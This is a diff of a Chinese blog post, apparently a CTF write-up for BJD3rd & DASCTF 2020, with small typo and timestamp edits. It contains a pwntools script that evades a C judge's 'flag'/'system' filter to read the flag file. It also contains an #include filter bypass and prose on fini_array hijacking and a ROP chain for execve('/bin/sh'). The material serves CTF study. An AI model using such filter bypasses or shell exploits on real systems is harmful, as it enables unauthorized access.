@@ -20,23 +20,23 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/blog/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路劲/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
+  <meta name="description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路径/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
 <meta name="keywords" content="2020,BJD3rdCTF,DASCTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BJD3rd&amp;DASCTF-WriteUp">
 <meta property="og:url" content="http://yoursite.com/2020/05/26/BJD3rnd-DASCTF-WriteUp/index.html">
 <meta property="og:site_name" content="Sncker&#39;s blog - qq948375961">
-<meta property="og:description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路劲/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
+<meta property="og:description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路径/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200526203246.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200526205834.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200527094827.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200527165533.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200527165720.png">
-<meta property="og:updated_time" content="2020-05-27T09:02:21.384Z">
+<meta property="og:updated_time" content="2020-05-27T10:13:16.552Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BJD3rd&amp;DASCTF-WriteUp">
-<meta name="twitter:description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路劲/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
+<meta name="twitter:description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路径/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
 <meta name="twitter:image" content="https://gitee.com/sncker/resource/raw/master/image/20200526203246.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/05/26/BJD3rnd-DASCTF-WriteUp/">
@@ -193,7 +193,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-27 17:02:21" itemprop="dateModified" datetime="2020-05-27T17:02:21+08:00">2020-05-27</time>
+                <time title="修改时间：2020-05-27 18:13:16" itemprop="dateModified" datetime="2020-05-27T18:13:16+08:00">2020-05-27</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -220,8 +220,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="TaQini-OJ-0"><a href="#TaQini-OJ-0" class="headerlink" title="TaQini OJ 0"></a>TaQini OJ 0</h2><p>没附件，盲打，nc上去。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200526203246.png" alt><br>一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路劲/home/ctf/flag<br>然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。  </p>
+        <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="TaQini-OJ-0"><a href="#TaQini-OJ-0" class="headerlink" title="TaQini OJ 0"></a>TaQini OJ 0</h2><p>没附件，盲打，nc上去。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200526203246.png" alt><br>一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路径/home/ctf/flag<br>然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"183.129.189.60"</span>, <span class="number">10075</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	char buff[128]=&#123;0&#125;, file[128]=&#123;0&#125;;</span></span><br><span class="line"><span class="string">	scanf("%s", file);</span></span><br><span class="line"><span class="string">	FILE* fp = fopen(file, "r");</span></span><br><span class="line"><span class="string">	fscanf(fp, "%s", buff);</span></span><br><span class="line"><span class="string">	printf("%s", buff);</span></span><br><span class="line"><span class="string">	return 0</span></span><br><span class="line"><span class="string">&#125;@</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"'@')"</span>, program)</span><br><span class="line">io.sendlineafter(<span class="string">"(Y/n)"</span>, <span class="string">"/home/ctf/flag"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
 
 <p>用输入来绕过flag的过滤。<br>看其它师傅的wp用包含秒了两道OJ题。。。  </p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"/home/ctf/f\</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">lag"</span>@</span></span><br></pre></td></tr></table></figure>
@@ -235,7 +237,7 @@
 <p>参数有三个函数指针，main,init,fini，其中init是main前调用的，fini是main后调用的。<br>而我们利用的点就在fini里边。fini调用的函数是__libc_csu_fini，它里面有个fini_array，存放两个函数指针，顺序是先执行fini_array[1]，再执行fini_array[0]。<br>我们利用的思路是：  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0] = __libc_csu_fini  </span><br><span class="line">fini_array[1] = main</span><br></pre></td></tr></table></figure>
 
-<p>这样就可以循环执行main，解决数据写入量少的问题。<br>然后就是部署Rop。One_gadget梭不出来，自己ROPgadget一个个找。<br>找完之后将Rop部署在fini_array+0x10的地方，然后打断循环，并将栈迁移到到我们部署的Rop上。  </p>
+<p>这样就可以循环执行main，解决数据写入量少的问题。<br>然后就是部署Rop。One_gadget梭不出来，自己ROPgadget一个个找。<br>找完之后将Rop部署在fini_array+0x10的地方，然后打断循环，并将栈迁移到我们部署的Rop上。  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0] = gadget: leave;ret</span><br><span class="line">fini_array[1] = gadget: ret</span><br></pre></td></tr></table></figure>
 
 <p>main执行完就会执行fini_array[0]，leave之后rsp就到了fini_array+0x8，这样放一个ret到<br>fini_array+0x8就可以执行fini_array+0x10的Rop_chain上了。<br>先找__libc_csu_fini的地址，跟一个start函数，按照参数顺序对应的r8寄存器。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200527165533.png" alt><br>跟进找fini_array的地址。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200527165720.png" alt><br>静态链接找gadget随便找。0x3b号系统调用execve(“/bin/sh”, 0, 0)<br>最后代码  </p>
